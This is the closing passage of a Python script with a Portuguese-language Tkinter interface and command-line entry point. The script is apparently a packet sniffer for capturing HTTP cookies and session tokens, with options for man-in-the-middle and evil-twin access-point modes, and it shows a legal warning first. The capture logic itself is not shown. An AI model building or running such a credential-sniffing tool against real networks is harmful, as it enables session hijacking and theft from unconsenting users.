    ttk.Checkbutton(frame_options, text="Testar Cookies", variable=var_test_cookies).grid(row=5, column=0, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Testar Tokens", variable=var_test_tokens).grid(row=5, column=1, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Exportar como ZIP", variable=var_zip).grid(row=6, column=0, padx=5, pady=2, sticky="w")

    # Botões
    ttk.Button(frame_buttons, text="Iniciar Captura", command=start_sniffing).grid(row=0, column=0, padx=5, pady=5)
    ttk.Button(frame_buttons, text="Limpar Resultados", command=clear_results).grid(row=0, column=1, padx=5, pady=5)
    ttk.Button(frame_buttons, text="Sair", command=lambda: sys.exit(0)).grid(row=0, column=2, padx=5, pady=5)

    # Progresso
    progress_bar = ttk.Progressbar(frame_progress, orient="horizontal", length=600, mode="determinate")
    progress_bar.grid(row=0, column=0, padx=5, pady=5)

    # Resultados
    text_results = tk.Text(frame_results, height=10, width=80)
    text_results.grid(row=0, column=0, padx=5, pady=5)
    scrollbar = ttk.Scrollbar(frame_results, orient="vertical", command=text_results.yview)
    scrollbar.grid(row=0, column=1, sticky="ns")
    text_results["yscrollcommand"] = scrollbar.set
    text_results.tag_configure("success", foreground="green")
    text_results.tag_configure("error", foreground="red")
    text_results.tag_configure("warning", foreground="orange")
    text_results.tag_configure("info", foreground="blue")

    # Exibir interfaces disponíveis
    interfaces = list_interfaces()
    if interfaces:
        text_results.insert(tk.END, f"[INFO] Interfaces disponíveis: {', '.join(interfaces)}\n", "info")

    root.mainloop()

# Função principal
def main():
    config = load_config()
    if not show_legal_warning(config):
        return
    setup_logging(config["output_dir"], False)
    interfaces = list_interfaces()
    if interfaces:
        print(f"\033[1;94m[INFO] Interfaces disponíveis: {', '.join(interfaces)}")
    options = interactive_menu(config)
    cookies, tokens = sniff_packets(
        ",".join(options["interfaces"]), options["filters"], options["max_packets"], options["timeout"],
        options["output_dir"], options["domain_filter"], options["http_method"], options["cookie_type"],
        options["ip_filter"], options["header_filter"], options["continuous"], options["pcap"],
        options["mitm"], options["dry_run"], options["wireshark_live"], options["xss_detect"],
        options["domain_validate"], options["token_capture"], options["websocket"], options["evil_twin"]
    )
    if options["zip_output"]:
        zip_path = export_to_zip(options["output_dir"])
        if zip_path:
            print(f"\033[1;92m[INFO] Resultados exportados para {zip_path}")

if __name__ == "__main__":
    main()
```
